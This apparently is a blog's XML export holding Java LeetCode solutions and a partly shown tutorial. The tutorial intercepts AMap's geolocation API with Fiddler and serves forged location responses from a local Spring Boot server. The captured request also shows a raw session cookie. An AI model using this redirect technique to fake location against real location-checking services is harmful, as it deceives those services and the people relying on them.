    <content type="text"><![CDATA[题目：349. 两个数组的交集难度：简单 定两个数组，编写一个函数来计算它们的交集。 示例 1： 12输入：nums1 = [1,2,2,1], nums2 = [2,2]输出：[2] 示例 2： 12输入：nums1 = [4,9,5], nums2 = [9,4,9,8,4]输出：[9,4] 说明： 输出结果中的每个元素一定是唯一的。 我们可以不考虑输出结果的顺序。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/intersection-of-two-arrays著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 利用哈希表求两个数组的交集即可 解题代码12345678910111213141516171819202122class Solution &#123; public int[] intersection(int[] nums1, int[] nums2) &#123; Set&lt;Integer&gt; s = new HashSet&lt;&gt;(); for (int i : nums1) &#123; s.add(i); &#125; Set&lt;Integer&gt; set = new HashSet&lt;&gt;(); for (int i : nums2) &#123; if (s.contains(i)) &#123; set.add(i); &#125; &#125; int ans[] = new int[set.size()]; int index = 0; for (int e : set) &#123; ans[index++] = e; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/30]]></title>
    <url>%2Fposts%2F2c9cb36f%2F</url>
    <content type="text"><![CDATA[题目：463. 岛屿的周长难度：简单 给定一个包含 0 和 1 的二维网格地图，其中 1 表示陆地 0 表示水域。 网格中的格子水平和垂直方向相连（对角线方向不相连）。整个网格被水完全包围，但其中恰好有一个岛屿（或者说，一个或多个表示陆地的格子相连组成的岛屿）。 岛屿中没有“湖”（“湖” 指水域在岛屿内部且不和岛屿周围的水相连）。格子是边长为 1 的正方形。网格为长方形，且宽度和高度均不超过 100 。计算这个岛屿的周长。 示例 : 1234567891011输入:[[0,1,0,0], [1,1,1,0], [0,1,0,0], [1,1,0,0]]输出: 16解释: 它的周长是下面图片中的 16 个黄色的边：如下图： 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/island-perimeter著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 遍历数组，遇到1就贡献4，但是如果前面有相邻的方格就抵消2 解题代码123456789101112131415161718192021class Solution &#123; public int islandPerimeter(int[][] grid) &#123; int ans = 0; for (int i = 0;i &lt; grid.length;i++) &#123; for (int j = 0;j &lt; grid[i].length;j++) &#123; if (grid[i][j] == 1) &#123; ans += 4; if (i - 1 &gt;= 0 &amp;&amp; grid[i - 1][j] == 1) &#123; ans -= 2; &#125; if (j - 1 &gt;=0 &amp;&amp; grid[i][j - 1] == 1) &#123; ans -= 2; &#125; &#125; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>找规律</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/29]]></title>
    <url>%2Fposts%2F4c5b3a8a%2F</url>
    <content type="text"><![CDATA[题目：129. 求根到叶子节点数字之和难度：中等 给定一个二叉树，它的每个结点都存放一个 0-9 的数字，每条从根到叶子节点的路径都代表一个数字。 例如，从根到叶子节点路径 1-&gt;2-&gt;3 代表数字 123。 计算从根到叶子节点生成的所有数字之和。 说明: 叶子节点是指没有子节点的节点。 示例 1: 123456789输入: [1,2,3] 1 / \ 2 3输出: 25解释:从根到叶子节点路径 1-&gt;2 代表数字 12.从根到叶子节点路径 1-&gt;3 代表数字 13.因此，数字总和 = 12 + 13 = 25. 示例 2: 123456789101112输入: [4,9,0,5,1] 4 / \ 9 0 / \5 1输出: 1026解释:从根到叶子节点路径 4-&gt;9-&gt;5 代表数字 495.从根到叶子节点路径 4-&gt;9-&gt;1 代表数字 491.从根到叶子节点路径 4-&gt;0 代表数字 40.因此，数字总和 = 495 + 491 + 40 = 1026. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sum-root-to-leaf-numbers著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 搜索并保存每条从根到每个叶子结点的路径，相加即可 解题代码123456789101112131415161718192021222324252627282930/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public int sumNumbers(TreeNode root) &#123; dfs(root,new StringBuilder()); return ans; &#125; int ans = 0; private void dfs(TreeNode root,StringBuilder builder) &#123; if (root == null) &#123; return; &#125; builder.append(root.val); if (root.left == null &amp;&amp; root.right == null) &#123; ans += Integer.valueOf(builder.toString()); &#125; dfs(root.left,builder); dfs(root.right,builder); builder.deleteCharAt(builder.length() - 1); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/28]]></title>
    <url>%2Fposts%2F3b5c0a1c%2F</url>
    <content type="text"><![CDATA[题目：1207. 独一无二的出现次数难度：简单 给你一个整数数组 arr，请你帮忙统计数组中每个数的出现次数。 如果每个数的出现次数都是独一无二的，就返回 true；否则返回 false。 示例 1： 123输入：arr = [1,2,2,1,1,3]输出：true解释：在该数组中，1 出现了 3 次，2 出现了 2 次，3 只出现了 1 次。没有两个数的出现次数相同。 示例 2： 12输入：arr = [1,2]输出：false 示例 3： 12输入：arr = [-3,0,1,-3,1,1,1,-3,10,0]输出：true 提示： 1 &lt;= arr.length &lt;= 1000 -1000 &lt;= arr[i] &lt;= 1000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/unique-number-of-occurrences著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 利用hashmap统计出现的次数，然后利用hashset判断map的values是否存在重复的元素即可 解题代码1234567891011121314class Solution &#123; public boolean uniqueOccurrences(int[] arr) &#123; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0;i &lt; arr.length;i++) &#123; if (map.containsKey(arr[i])) &#123; map.put(arr[i],map.get(arr[i]) + 1); &#125; else &#123; map.put(arr[i],1); &#125; &#125; return map.size() == new HashSet&lt;Integer&gt;(map.values()).size(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/27]]></title>
    <url>%2Fposts%2Fabe3178d%2F</url>
    <content type="text"><![CDATA[题目：144. 二叉树的前序遍历难度：中等 给定一个二叉树，返回它的 前序 遍历。 示例: 12345678输入: [1,null,2,3] 1 \ 2 / 3 输出: [1,2,3] 进阶: 递归算法很简单，你可以通过迭代算法完成吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-tree-preorder-traversal著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二叉树的遍历是经典的递归案例了 解题代码1234567891011121314151617181920212223242526272829303132/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; dfs(root); return ans; &#125; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; ans.add(root.val); dfs(root.left); dfs(root.right); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/26]]></title>
    <url>%2Fposts%2Fdce4271b%2F</url>
    <content type="text"><![CDATA[题目：1365. 有多少小于当前数字的数字难度：简单 给你一个数组 nums，对于其中每个元素 nums[i]，请你统计数组中比它小的所有数字的数目。 换而言之，对于每个 nums[i] 你必须计算出有效的 j 的数量，其中 j 满足 j != i 且 nums[j] &lt; nums[i] 。 以数组形式返回答案。 示例 1： 12345678输入：nums = [8,1,2,2,3]输出：[4,0,1,1,3]解释： 对于 nums[0]=8 存在四个比它小的数字：（1，2，2 和 3）。 对于 nums[1]=1 不存在比它小的数字。对于 nums[2]=2 存在一个比它小的数字：（1）。 对于 nums[3]=2 存在一个比它小的数字：（1）。 对于 nums[4]=3 存在三个比它小的数字：（1，2 和 2）。 示例 2： 12输入：nums = [6,5,4,8]输出：[2,1,0,3] 示例 3： 12输入：nums = [7,7,7,7]输出：[0,0,0,0] 提示： 2 &lt;= nums.length &lt;= 500 0 &lt;= nums[i] &lt;= 100 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/how-many-numbers-are-smaller-than-the-current-number著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 暴力计数 解题代码12345678910111213141516171819class Solution &#123; public int[] smallerNumbersThanCurrent(int[] nums) &#123; int[] ans = new int[nums.length]; for (int i = 0;i &lt; nums.length;i++) &#123; int cnt = 0; for (int j = 0;j &lt; nums.length;j++) &#123; if (nums[i] &gt; nums[j]) &#123; cnt++; &#125; &#125; ans[i] = cnt; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/25]]></title>
    <url>%2Fposts%2F45ed76a1%2F</url>
    <content type="text"><![CDATA[题目：845. 数组中的最长山脉难度：中等 我们把数组 A 中符合下列属性的任意连续子数组 B 称为 “山脉”： B.length &gt;= 3 存在 0 &lt; i &lt; B.length - 1 使得 B[0] &lt; B[1] &lt; … B[i-1] &lt; B[i] &gt; B[i+1] &gt; … &gt; B[B.length - 1]（注意：B 可以是 A 的任意子数组，包括整个数组 A。） 给出一个整数数组 A，返回最长 “山脉” 的长度。 如果不含有 “山脉” 则返回 0。 示例 1： 123输入：[2,1,4,7,3,2,5]输出：5解释：最长的 “山脉” 是 [1,4,7,3,2]，长度为 5。 示例 2： 123输入：[2,2,2]输出：0解释：不含 “山脉”。 提示： 0 &lt;= A.length &lt;= 10000 0 &lt;= A[i] &lt;= 10000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/longest-mountain-in-array著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 扫描整个数组，用双指针的方式根据山脉数组的定义，每次更新ans即可 解题代码12345678910111213141516171819202122232425262728class Solution &#123; public int longestMountain(int[] A) &#123; int ans = 0; for (int i = 1;i &lt; A.length - 1;i++) &#123; int left = i - 1; int right = i + 1; if (A[left] &lt; A[i] &amp;&amp; A[i] &gt; A[right]) &#123; // System.out.println(i); while (left - 1 &gt;= 0 &amp;&amp; A[left - 1] &lt; A[left]) &#123; left--; &#125; // System.out.println("left = "+left); while (right + 1 &lt; A.length &amp;&amp; A[right] &gt; A[right + 1]) &#123; right++; &#125; // System.out.println("right = "+right); ans = Math.max(ans,right - left + 1); &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/24]]></title>
    <url>%2Fposts%2F32ea4637%2F</url>
    <content type="text"><![CDATA[题目：1024. 视频拼接难度：中等 你将会获得一系列视频片段，这些片段来自于一项持续时长为 T 秒的体育赛事。这些片段可能有所重叠，也可能长度不一。 视频片段 clips[i] 都用区间进行表示：开始于 clips[i][0] 并于 clips[i][1] 结束。我们甚至可以对这些片段自由地再剪辑，例如片段 [0, 7] 可以剪切成 [0, 1] + [1, 3] + [3, 7] 三部分。 我们需要将这些片段进行再剪辑，并将剪辑后的内容拼接成覆盖整个运动过程的片段（[0, T]）。返回所需片段的最小数目，如果无法完成该任务，则返回 -1 。 示例 1： 1234567输入：clips = [[0,2],[4,6],[8,10],[1,9],[1,5],[5,9]], T = 10输出：3解释：我们选中 [0,2], [8,10], [1,9] 这三个片段。然后，按下面的方案重制比赛片段：将 [1,9] 再剪辑为 [1,2] + [2,8] + [8,9] 。现在我们手上有 [0,2] + [2,8] + [8,10]，而这些涵盖了整场比赛 [0, 10]。 示例 2： 1234输入：clips = [[0,1],[1,2]], T = 5输出：-1解释：我们无法只用 [0,1] 和 [1,2] 覆盖 [0,5] 的整个过程。 示例 3： 1234输入：clips = [[0,1],[6,8],[0,2],[5,6],[0,4],[0,3],[6,7],[1,3],[4,7],[1,4],[2,5],[2,6],[3,4],[4,5],[5,7],[6,9]], T = 9输出：3解释： 我们选取片段 [0,4], [4,7] 和 [6,9] 。 示例 4： 1234输入：clips = [[0,4],[2,8]], T = 5输出：2解释：注意，你可能录制超过比赛结束时间的视频。 提示： 1 &lt;= clips.length &lt;= 100 0 &lt;= clips[i][0] &lt;= clips[i][1] &lt;= 100 0 &lt;= T &lt;= 100 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/video-stitching著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 注意到：此题有右端点越远越有利这么一个特点，于是我们可以用一个数组记录下，左端点相同的区间，可到达的最远的右端点的位置，然后我们去枚举[0,T]的每个位置 i 作为起点，对每个起点 i 都贪心的去尝试其能够覆盖到的最远的位置，假设当枚举到位置 i 时，记左端点不大于 i 的所有子区间的最远右端点为 last。这样 last 就代表了当前能覆盖到的最远的右端点。每次我们枚举到一个新位置，我们都用 maxEnd[i] 来更新 last。如果更新后 last == i，那么说明下一个位置无法被覆盖，我们无法完成目标，此时应该返回 -1 。同时我们还需要记录上一个被使用的子区间的结束位置为 pre，每次我们越过一个被使用的子区间，就说明我们要启用一个新子区间，这个新子区间的结束位置即为当前的 last。也就是说，每次我们遇到 i == pre ，则说明我们用完了一个被使用的子区间。这种情况下我们让答案加 1，并更新 pre 为上一次的 last 即可。 解题代码1234567891011121314151617181920212223242526272829303132class Solution &#123; public int videoStitching(int[][] clips, int T) &#123; int maxEnd[] = new int[T]; for (int[] clip : clips) &#123; if (clip[0] &lt; T) &#123; maxEnd[clip[0]] = Math.max(maxEnd[clip[0]],clip[1]); &#125; &#125; // System.out.println(Arrays.toString(maxEnd)); int ans = 0; int last = 0; int pre = 0; for (int i = 0;i &lt; T;i++) &#123; last = Math.max(last,maxEnd[i]); if (i == last) &#123; return -1; &#125; if (i == pre) &#123; // System.out.println(i+","+last); ans++; pre = last; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/23]]></title>
    <url>%2Fposts%2Fac8ed394%2F</url>
    <content type="text"><![CDATA[题目：234. 回文链表难度：简单 请判断一个链表是否为回文链表。 示例 1: 12输入: 1-&gt;2输出: false 示例 2: 12输入: 1-&gt;2-&gt;2-&gt;1输出: true 进阶： 你能否用 O(n) 时间复杂度和 O(1) 空间复杂度解决此题？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/palindrome-linked-list著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 最朴素的思路是：两次遍历链表，第一次遍历之后放入集合中，第二次判断是否回文 解题代码12345678910111213141516171819202122232425262728293031/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public boolean isPalindrome(ListNode head) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); ListNode cur = head; while (cur != null) &#123; list.add(cur.val); cur = cur.next; &#125; int i = 0; cur = head; while (cur != null) &#123; if (cur.val != list.get(list.size() - i - 1)) &#123; return false; &#125; cur = cur.next; i++; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/22]]></title>
    <url>%2Fposts%2Fdb89e302%2F</url>
    <content type="text"><![CDATA[题目：763. 划分字母区间难度：中等 字符串 S 由小写字母组成。我们要把这个字符串划分为尽可能多的片段，同一个字母只会出现在其中的一个片段。返回一个表示每个字符串片段的长度的列表。 示例 1： 123456输入：S = &quot;ababcbacadefegdehijhklij&quot;输出：[9,7,8]解释：划分结果为 &quot;ababcbaca&quot;, &quot;defegde&quot;, &quot;hijhklij&quot;。每个字母最多出现在一个片段中。像 &quot;ababcbacadefegde&quot;, &quot;hijhklij&quot; 的划分是错误的，因为划分的片段数较少。 提示： S的长度在[1, 500]之间。 S只包含小写字母 ‘a’ 到 ‘z’ 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/partition-labels著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 记录下每个字符最后出现的位置（下标），然后使用双指针，用贪心的策略去划分尽可能多的片段即可 解题代码123456789101112131415161718192021222324class Solution &#123; public List&lt;Integer&gt; partitionLabels(String S) &#123; Map&lt;Character,Integer&gt; last = new HashMap&lt;&gt;(); int len = S.length(); for (int i = 0; i &lt; len; i++) &#123; last.put(S.charAt(i),i); &#125; List&lt;Integer&gt; ans = new ArrayList&lt;Integer&gt;(); int start = 0; int end = 0; for (int i = 0; i &lt; len; i++) &#123; end = Math.max(end, last.get(S.charAt(i))); if (i == end) &#123; ans.add(end - start + 1); start = end + 1; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>字符串</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实战fiddler劫持高德地图api伪装位置]]></title>
    <url>%2Fposts%2Fe2047c6%2F</url>
    <content type="text"><![CDATA[工具及用途 fiddler抓包，分析网络流量，劫持请求和响应 一个好用的文本编辑器或者IDE，比如notepad++或者vs code nodejs或者python或者java或者其他，选一种你喜欢的编程语言来写服务器端应用 准备 先去高德地图开放平台申请一个Web端应用，得到key 然后参考文档快速的写一个简单的定位的网页，为了节约时间，我这里给出一个简单的示例demo，使用时将下面的代码保存到本地，可以命名为a.html或者其他，然后将自己申请好的key，填入源代码对应位置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 id="showLocation"&gt;获取定位中。。。&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&lt;script src="https://webapi.amap.com/loader.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; AMapLoader.load(&#123; "key": "申请好的Web端开发者Key", // 申请好的Web端开发者Key，首次调用 load 时必填 "version": "1.4.15", // 指定要加载的 JSAPI 的版本，缺省时默认为 1.4.15 "plugins": [], // 需要使用的的插件列表，如比例尺'AMap.Scale'等 "AMapUI": &#123; // 是否加载 AMapUI，缺省不加载 "version": '1.1', // AMapUI 缺省 1.1 "plugins": ['overlay/SimpleMarker'], // 需要加载的 AMapUI ui插件 &#125;, "Loca": &#123; // 是否加载 Loca， 缺省不加载 "version": '1.3.2' // Loca 版本，缺省 1.3.2 &#125;, &#125;).then((AMap) =&gt; &#123; AMap.plugin('AMap.Geolocation', function () &#123; var geolocation = new AMap.Geolocation(&#123; // 是否使用高精度定位，默认：true enableHighAccuracy: true, // 定位按钮的停靠位置的偏移量，默认：Pixel(10, 20) buttonOffset: new AMap.Pixel(10, 20), // 定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false zoomToAccuracy: true, // 定位按钮的排放位置, RB表示右下 buttonPosition: 'RB' &#125;) geolocation.getCurrentPosition(function (status, result) &#123; if (status == 'complete') &#123; onComplete(result) &#125; else &#123; onError(result) &#125; &#125;); function onComplete(data) &#123; // data是具体的定位信息 console.log('定位成功') document.getElementById('showLocation').innerText = data.formattedAddress console.log(JSON.stringify(data)) &#125; function onError(data) &#123; // 定位出错 console.log('定位出错') console.log(data) &#125; &#125;) &#125;).catch((e) =&gt; &#123; console.log(e); //加载错误提示 &#125;);&lt;/script&gt; 然后双击使用浏览器打开该html文件，推荐chorme浏览器，不出意外的话（定位是个耗时操作，可能需要等一下），你应该可以看到类似下面这样的网页，没什么特别的，就是定位到了你的当前位置（小声bb：当然，我这是伪装过的） 开始配置fiddler打开fiddler，菜单栏选择Tools-&gt;Options-&gt;Connections，如下图配置就行，然后重启fiddler 抓包分析定位报文浏览器打开a.html，定位成功后查看fiddler中抓到的报文，如下： 123456789101112# 请求GET https://restapi.amap.com/v3/geocode/regeo?key=你申请的key&amp;s=rsv3&amp;language=zh_cn&amp;location=116.333374,40.009645&amp;extensions=base&amp;callback=jsonp_98368_&amp;platform=JS&amp;logversion=2.0&amp;appname=file%3A%2F%2F%2FC%3A%2FUsers%2Fzimo%2FDesktop%2Fa.html&amp;csid=45AD182B-2FF2-45B1-A74B-134A116B1242&amp;sdkversion=1.4.15 HTTP/1.1Host: restapi.amap.comConnection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36Accept: */*Sec-Fetch-Site: cross-siteSec-Fetch-Mode: no-corsSec-Fetch-Dest: scriptAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: cna=wO0GGESg9wICAd4SfkOgapRy; xlly_s=1; passport_login=MjA0ODYxODA4LGFtYXBCR1hNUkx0NmIsbWZremZ1eWVpc2Z1NWNndzNpcmhqc2ptNXp4c3JmdHosMTYwMzI5MDUzMixOMlF5TkRFME5USTJNbVExTXpBeU16Smtaab15TjJObU1EUmpORGc1T0RjPQ%3D%3D 123456789101112131415# 响应HTTP/1.1 200 OKServer: TengineDate: Thu, 22 Oct 2020 03:14:11 GMTContent-Type: application/json;charset=utf-8Connection: closeContent-Length: 702gsid: 033015141109160333645149200012074647900sc: 0.004Access-Control-Allow-Origin: *Access-Control-Allow-Methods: *Access-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,key,x-biz,x-info,platinfo,encr,enginever,gzipped,poiidjsonp_98368_(&#123;&apos;status&apos;: &apos;1&apos;, &apos;regeocode&apos;: &#123;&apos;addressComponent&apos;: &#123;&apos;city&apos;: [], &apos;province&apos;: &apos;北京市&apos;, &apos;adcode&apos;: &apos;110108&apos;, &apos;district&apos;: &apos;海淀区&apos;, &apos;towncode&apos;: &apos;110108014000&apos;, &apos;streetNumber&apos;: &#123;&apos;number&apos;: &apos;7号&apos;, &apos;location&apos;: &apos;116.330383,40.008245&apos;, &apos;direction&apos;: &apos;西南&apos;, &apos;distance&apos;: &apos;298.527&apos;, &apos;street&apos;: &apos;荷清路&apos;&#125;, &apos;country&apos;: &apos;中国&apos;, &apos;township&apos;: &apos;清华园街道&apos;, &apos;businessAreas&apos;: [&#123;&apos;location&apos;: &apos;116.341578,39.991180&apos;, &apos;name&apos;: &apos;五道口&apos;, &apos;id&apos;: &apos;110108&apos;&#125;], &apos;building&apos;: &#123;&apos;name&apos;: [], &apos;type&apos;: []&#125;, &apos;neighborhood&apos;: &#123;&apos;name&apos;: &apos;清华大学&apos;, &apos;type&apos;: &apos;科教文化服务;科研机构;科研机构&apos;&#125;, &apos;citycode&apos;: &apos;010&apos;&#125;, &apos;formatted_address&apos;: &apos;北京市海淀区清华园街道清华大学&apos;&#125;, &apos;info&apos;: &apos;OK&apos;, &apos;infocode&apos;: &apos;10000&apos;&#125;) 编写服务器端应用模拟响应报文我使用的是IDE是IntelliJ IDEA 2019.3.3，编程语言是java，另外使用了springboot框架快速构建服务器端应用，当然，你可以选择你熟悉的其他方式，不再赘述相关内容，在此直接贴出controller类的代码 1234567891011121314151617181920212223242526272829303132333435363738394041package wiki.zimo.demo.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.util.Date;@Controllerpublic class TestController &#123; @RequestMapping("/v3/geocode/regeo") public void locate( @RequestParam("key") String key, @RequestParam("s") String s, @RequestParam("language") String language, @RequestParam("location") String location, @RequestParam("extensions") String extensions, @RequestParam("callback") String callback, @RequestParam("platform") String platform, @RequestParam("logversion") String logversion, @RequestParam("appname") String appname, @RequestParam("csid") String csid, @RequestParam("sdkversion") String sdkversion, HttpServletResponse response) throws IOException &#123; response.addHeader("Date", new Date().toGMTString()); response.addHeader("Content-Type", "application/json;charset=utf-8"); response.addHeader("Connection", "close"); response.addHeader("gsid", "011018245168159885414704300017308414815"); response.addHeader("sc", "0.004"); response.addHeader("Access-Control-Allow-Origin", "*"); response.addHeader("Access-Control-Allow-Methods", "*"); response.addHeader("Access-Control-Allow-Headers", "DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,key,x-biz,x-info,platinfo,encr,enginever,gzipped,poiid"); response.addHeader("Server", "Tengine"); // 下面的json就是你想要伪装的位置 String json = "&#123;'status': '1', 'regeocode': &#123;'addressComponent': &#123;'city': [], 'province': '北京市', 'adcode': '110108', 'district': '海淀区', 'towncode': '110108014000', 'streetNumber': &#123;'number': '7号', 'location': '116.330383,40.008245', 'direction': '西南', 'distance': '298.527', 'street': '荷清路'&#125;, 'country': '中国', 'township': '清华园街道', 'businessAreas': [&#123;'location': '116.341578,39.991180', 'name': '五道口', 'id': '110108'&#125;], 'building': &#123;'name': [], 'type': []&#125;, 'neighborhood': &#123;'name': '清华大学', 'type': '科教文化服务;科研机构;科研机构'&#125;, 'citycode': '010'&#125;, 'formatted_address': '北京市海淀区清华园街道清华大学'&#125;, 'info': 'OK', 'infocode': '10000'&#125;"; response.getWriter().write(callback + String.format("(%s)", json)); &#125;&#125; 修改fiddler自定义规则修改fiddler的自定义规则（快捷键 Ctrl + R），使之劫持请求定位的接口https://restapi.amap.com/v3/geocode/regeo将它定向到请求我们自己编写的模拟响应报文的服务器端应用，从而实现伪装定位的目的，脚本如下（此处我是在OnBeforeRequest方法的最后插入了下面这段脚本，当然，也可以处理其他的，比如处理响应之前的）： 12345var origin_host=&quot;https://restapi.amap.com/v3/geocode/regeo&quot;;var replace_host=&quot;http://localhost:8080/v3/geocode/regeo&quot;;if(oSession.uriContains(origin_host))&#123; oSession.fullUrl = oSession.fullUrl.Replace(origin_host,replace_host);&#125; 下面定位到天安门试试修改服务器端应用，将json替换为你想定位到的地方，并且需要保证是合法的高德地图定位接口所返回的内容，我这里提供一段python脚本，主要功能是利用高德地图的地理/逆地理编码api得到合法的json位置，使用前需要安装python和requests库，参考命令pip install requests，并申请高德地图Web服务应用，获取到相应的key（注意：这个key和上面的Web端的key并不相同） 123# location 就是你想定位到的经纬度坐标，可以使用坐标拾取系统得到res = requests.get('https://restapi.amap.com/v3/geocode/regeo?key=你的key&amp;location=116.403963,39.915119')print(res.json()) 浏览器console输出如下： 1&#123;&quot;type&quot;:&quot;complete&quot;,&quot;info&quot;:&quot;SUCCESS&quot;,&quot;status&quot;:1,&quot;ZDa&quot;:&quot;jsonp_590192_&quot;,&quot;position&quot;:&#123;&quot;Q&quot;:30.58052,&quot;R&quot;:103.9923,&quot;lng&quot;:103.9923,&quot;lat&quot;:30.58052&#125;,&quot;message&quot;:&quot;Get ipLocation success.Get address success.&quot;,&quot;location_type&quot;:&quot;ip&quot;,&quot;accuracy&quot;:null,&quot;isConverted&quot;:true,&quot;addressComponent&quot;:&#123;&quot;citycode&quot;:&quot;010&quot;,&quot;adcode&quot;:&quot;110101&quot;,&quot;businessAreas&quot;:[&#123;&quot;name&quot;:&quot;东单&quot;,&quot;id&quot;:&quot;110101&quot;,&quot;location&quot;:&#123;&quot;Q&quot;:39.913479,&quot;R&quot;:116.41680400000001,&quot;lng&quot;:116.416804,&quot;lat&quot;:39.913479&#125;&#125;,&#123;&quot;name&quot;:&quot;王府井&quot;,&quot;id&quot;:&quot;110101&quot;,&quot;location&quot;:&#123;&quot;Q&quot;:39.913505,&quot;R&quot;:116.41203100000001,&quot;lng&quot;:116.412031,&quot;lat&quot;:39.913505&#125;&#125;,&#123;&quot;name&quot;:&quot;东四&quot;,&quot;id&quot;:&quot;110101&quot;,&quot;location&quot;:&#123;&quot;Q&quot;:39.929561,&quot;R&quot;:116.42517099999998,&quot;lng&quot;:116.425171,&quot;lat&quot;:39.929561&#125;&#125;],&quot;neighborhoodType&quot;:&quot;&quot;,&quot;neighborhood&quot;:&quot;&quot;,&quot;building&quot;:&quot;&quot;,&quot;buildingType&quot;:&quot;&quot;,&quot;street&quot;:&quot;东华门大街&quot;,